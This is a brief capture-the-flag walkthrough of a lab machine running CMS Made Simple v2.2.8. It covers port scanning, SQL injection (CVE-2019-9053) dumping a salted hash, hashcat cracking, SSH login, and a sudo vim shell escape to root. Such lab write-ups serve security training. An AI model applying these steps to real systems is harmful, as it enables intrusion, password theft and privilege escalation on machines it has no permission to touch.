# Simple CTF

### IP: 10.10.200.42

### PORTS

```
nmap -A
```
- 21
- 80
- 2222

### 21
- anonymous allowed
- pub/ForMitch.txt

### 80
- apache2 default
- /simple

#### /simple
- CMS made simple
- v2.2.8
 whenever  there is a CMS, exploitDB

### ExploitDB
- CVE-2019-9053 
- sqli for <v2.2.10
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96

## Hashcat 
```
hashcat -a 0 -m 20 pass:hash rockyou
```
- password: secret


## SSH
```
ssh mitch@ip -p 2222
```
- user.txt : G00d j0b, keep up!

```
sudo -l
```
- /usr/bin/vim
    - it means I can try GTFOBin

## USER 2 : sunbath

## GTFOBIN

```
sudo vim -c ':!/bin/sh'
```
- root.txt : W3ll d0n3. You made it!
